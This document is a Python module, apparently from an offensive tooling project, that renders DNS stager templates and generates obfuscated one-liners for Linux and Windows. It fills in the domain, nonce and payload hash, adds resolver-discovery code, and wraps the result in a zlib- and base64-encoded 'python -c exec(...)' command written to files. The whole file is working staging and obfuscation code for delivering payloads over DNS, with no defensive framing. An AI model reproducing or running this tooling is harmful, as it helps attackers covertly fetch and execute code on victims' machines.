# -*- coding: ascii -*-
"""
DNS stager template rendering and one-liner generation.
"""

from __future__ import absolute_import

import base64
import hashlib
import os
import subprocess
import zlib

try:
    text_type = unicode
except NameError:
    text_type = str

_PLACEHOLDERS = (
    '{{BASE_DOMAIN}}',
    '{{CNAME_SUFFIX}}',
    '{{STAGER_NONCE}}',
    '{{PAYLOAD_HASH}}',
    '{{SFB_ARGS}}',
    '{{RESOLVER_SNIPPET}}',
)

_LINUX_RESOLVER_LINES = [
    '    try:',
    '        handle = open(\'/etc/resolv.conf\', \'r\')',
    '    except (IOError, OSError):',
    '        return None',
    '    try:',
    '        for line in handle:',
    '            line = line.strip()',
    '            if not line or line.startswith(\'#\'):',
    '                continue',
    '            if \'#\' in line:',
    '                line = line.split(\'#\', 1)[0].strip()',
    '                if not line:',
    '                    continue',
    '            parts = line.split()',
    '            if len(parts) < 2 or parts[0].lower() != \'nameserver\':',
    '                continue',
    '            return parts[1]',
    '    finally:',
    '        handle.close()',
    '    return None',
]

_WINDOWS_RESOLVER_LINES = [
    '    try:',
    '        proc = subprocess.Popen(',
    '            [\'nslookup\', \'google.com\'],',
    '            stdout=subprocess.PIPE,',
    '            stderr=subprocess.PIPE,',
    '            universal_newlines=True,',
    '        )',
    '    except (IOError, OSError):',
    '        return None',
    '    try:',
    '        output, _ = proc.communicate()',
    '    except Exception:',
    '        return None',
    '    if not output:',
    '        return None',
    '    lines = output.splitlines()',
    '    server_index = None',
    '    for i, line in enumerate(lines):',
    '        if line.startswith(\'Server:\'):',
    '            server_index = i',
    '            break',
    '    if server_index is None:',
    '        return None',
    '    ip_pattern = re.compile(r\'(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})\')',
    '    for line in lines[server_index + 1:]:',
    '        stripped = line.strip()',
    '        if not stripped:',
    '            continue',
    '        if stripped.startswith(\'Non-authoritative answer:\'):',
    '            break',
    '        match = ip_pattern.search(stripped)',
    '        if match:',
    '            return match.group(1)',
    '    return None',
]

LINUX_RESOLVER_SNIPPET = '\n'.join(_LINUX_RESOLVER_LINES)
WINDOWS_RESOLVER_SNIPPET = '\n'.join(_WINDOWS_RESOLVER_LINES)


def _repo_root():
    return os.path.abspath(
        os.path.join(
            os.path.dirname(__file__),
            os.pardir,
            os.pardir,
        )
    )


def _ensure_ascii_text(value, label):
    if isinstance(value, bytes):
        try:
            value = value.decode('ascii')
        except UnicodeError:
            raise ValueError('%s must be ASCII' % label)
    elif not isinstance(value, text_type):
        value = text_type(value)
    try:
        value.encode('ascii')
    except UnicodeError:
        raise ValueError('%s must be ASCII' % label)
    return value


def _read_ascii(path):
    with open(path, 'rb') as handle:
        data = handle.read()
    if isinstance(data, bytes):
        try:
            return data.decode('ascii')
        except UnicodeError:
            raise ValueError('Non-ASCII content in %s' % path)
    try:
        data.decode('ascii')
    except UnicodeError:
        raise ValueError('Non-ASCII content in %s' % path)
    return data


def _write_ascii(path, text):
    text = _ensure_ascii_text(text, 'output')
    with open(path, 'wb') as handle:
        handle.write(text.encode('ascii'))


def _normalize_domain(base_domain):
    base_domain = _ensure_ascii_text(base_domain, 'base_domain').strip()
    if not base_domain:
        raise ValueError('base_domain required')
    base_domain = base_domain.lower().strip('.')
    if not base_domain:
        raise ValueError('base_domain required')
    return base_domain


def _normalize_cname_label(value):
    if value is None:
        return ''
    value = _ensure_ascii_text(value, 'cname_label').strip()
    if not value:
        return ''
    value = value.strip('.')
    if not value:
        return ''
    if '.' in value:
        raise ValueError('cname_label must be a single label')
    return value


def _is_base32_label(label):
    allowed = set('ABCDEFGHIJKLMNOPQRSTUVWXYZ234567')
    try:
        text = label.upper()
    except AttributeError:
        return False
    for ch in text:
        if ch not in allowed:
            return False
    return True


def _normalize_stager_nonce(value):
    value = _ensure_ascii_text(value, 'stager_nonce').strip()
    if not value:
        raise ValueError('stager_nonce required')
    value = value.strip('.')
    if not value:
        raise ValueError('stager_nonce required')
    if '.' in value:
        raise ValueError('stager_nonce must be a single label')
    if len(value) > 63:
        raise ValueError('stager_nonce must be <= 63 characters')
    if _is_base32_label(value):
        raise ValueError('stager_nonce must include non-base32 characters')
    return value.lower()


def _normalize_payload_hash(value):
    if value is None:
        raise ValueError('payload_hash required')
    value = _ensure_ascii_text(value, 'payload_hash').strip().lower()
    if not value:
        raise ValueError('payload_hash required')
    if len(value) != 64:
        raise ValueError('payload_hash must be 64 hex characters')
    for ch in value:
        if ch not in '0123456789abcdef':
            raise ValueError('payload_hash must be lowercase hex')
    return value


def _build_cname_suffix(base_domain, cname_label):
    cname_label = _normalize_cname_label(cname_label)
    if cname_label:
        return '%s.%s' % (cname_label, base_domain)
    return base_domain


def _escape_python_string(value):
    value = _ensure_ascii_text(value, 'payload')
    out = []
    for ch in value:
        if ch == '\\':
            out.append('\\\\')
        elif ch == '\'':
            out.append('\\\'')
        elif ch == '\n':
            out.append('\\n')
        elif ch == '\r':
            out.append('\\r')
        elif ch == '\t':
            out.append('\\t')
        else:
            out.append(ch)
    return ''.join(out)


def _python_string_literal(value):
    return '\'' + _escape_python_string(value) + '\''


def _escape_python_string_double(value):
    value = _ensure_ascii_text(value, 'payload')
    out = []
    for ch in value:
        if ch == '\\':
            out.append('\\\\')
        elif ch == '"':
            out.append('\\"')
        elif ch == '\n':
            out.append('\\n')
        elif ch == '\r':
            out.append('\\r')
        elif ch == '\t':
            out.append('\\t')
        else:
            out.append(ch)
    return ''.join(out)


def _python_string_literal_double(value):
    return '"' + _escape_python_string_double(value) + '"'


def _payload_hash(payload_bytes):
    if payload_bytes is None:
        raise ValueError('payload_bytes required')
    payload_text = _ensure_ascii_text(payload_bytes, 'payload')
    payload_bytes = payload_text.encode('ascii')
    return hashlib.sha256(payload_bytes).hexdigest()


def _compress_payload(payload):
    payload = _ensure_ascii_text(payload, 'payload')
    compressed = zlib.compress(payload.encode('ascii'), 9)
    encoded = base64.b64encode(compressed)
    if isinstance(encoded, bytes):
        encoded = encoded.decode('ascii')
    return _ensure_ascii_text(encoded, 'payload')


def _format_args_list(args):
    if not args:
        return '[]'
    parts = []
    for arg in args:
        arg_text = _ensure_ascii_text(arg, 'arg')
        parts.append(_python_string_literal(arg_text))
    return '[' + ', '.join(parts) + ']'


def _render_template(template_text, base_domain, cname_suffix, stager_nonce,
                     payload_hash, sfb_args, resolver_snippet):
    rendered = template_text
    rendered = rendered.replace('{{BASE_DOMAIN}}', base_domain)
    rendered = rendered.replace('{{CNAME_SUFFIX}}', cname_suffix)
    rendered = rendered.replace('{{STAGER_NONCE}}', stager_nonce)
    rendered = rendered.replace('{{PAYLOAD_HASH}}', payload_hash)
    rendered = rendered.replace('{{SFB_ARGS}}', sfb_args)
    rendered = rendered.replace('{{RESOLVER_SNIPPET}}', resolver_snippet)
    for token in _PLACEHOLDERS:
        if token in rendered:
            raise ValueError('Template placeholder not replaced: %s' % token)
    return rendered


def render_dns_stager(template_path, base_domain, sfb_args, resolver_snippet,
                      cname_label=None, stager_nonce=None, payload_hash=None):
    template_text = _read_ascii(template_path)
    base_domain = _normalize_domain(base_domain)
    cname_suffix = _build_cname_suffix(base_domain, cname_label)
    stager_nonce = _normalize_stager_nonce(stager_nonce)
    payload_hash = _normalize_payload_hash(payload_hash)
    sfb_args = _format_args_list(sfb_args or [])
    resolver_snippet = _ensure_ascii_text(resolver_snippet, 'resolver snippet')
    return _render_template(
        template_text,
        base_domain,
        cname_suffix,
        stager_nonce,
        payload_hash,
        sfb_args,
        resolver_snippet,
    )


def _posix_shell_quote(value):
    value = _ensure_ascii_text(value, 'command')
    return '\'' + value.replace('\'', '\'\"\'\"\'') + '\''


def _windows_cmd(parts):
    try:
        return subprocess.list2cmdline(parts)
    except AttributeError:
        return ' '.join('"%s"' % part for part in parts)


def build_one_liner(payload, platform):
    encoded_payload = _compress_payload(payload)
    code = (
        'import base64,zlib;exec(zlib.decompress(base64.b64decode(%s))'
        '.decode("ascii"))'
        % _python_string_literal_double(encoded_payload)
    )
    if platform == 'posix':
        return 'python -c %s' % _posix_shell_quote(code)
    if platform == 'windows':
        return _windows_cmd(['python', '-c', code])
    raise ValueError('Unknown platform: %s' % platform)


def write_dns_stagers(base_domain, sfb_args=None, payload_bytes=None,
                      output_dir=None, template_path=None, cname_label=None,
                      stager_nonce=None):
    repo_root = _repo_root()
    if output_dir is None:
        output_dir = repo_root
    if template_path is None:
        template_path = os.path.join(
            repo_root,
            'sfb',
            'stagers',
            'dns_stager_template.py',
        )
    payload_hash = _payload_hash(payload_bytes)
    linux_payload = render_dns_stager(
        template_path,
        base_domain,
        sfb_args,
        LINUX_RESOLVER_SNIPPET,
        cname_label=cname_label,
        stager_nonce=stager_nonce,
        payload_hash=payload_hash,
    )
    windows_payload = render_dns_stager(
        template_path,
        base_domain,
        sfb_args,
        WINDOWS_RESOLVER_SNIPPET,
        cname_label=cname_label,
        stager_nonce=stager_nonce,
        payload_hash=payload_hash,
    )
    linux_cmd = build_one_liner(linux_payload, platform='posix')
    windows_cmd = build_one_liner(windows_payload, platform='windows')
    linux_path = os.path.join(output_dir, 'linux_dns_stager.txt')
    windows_path = os.path.join(output_dir, 'windows_dns_stager.txt')
    _write_ascii(linux_path, linux_cmd + '\n')
    _write_ascii(windows_path, windows_cmd + '\n')
    return {'linux': linux_path, 'windows': windows_path}
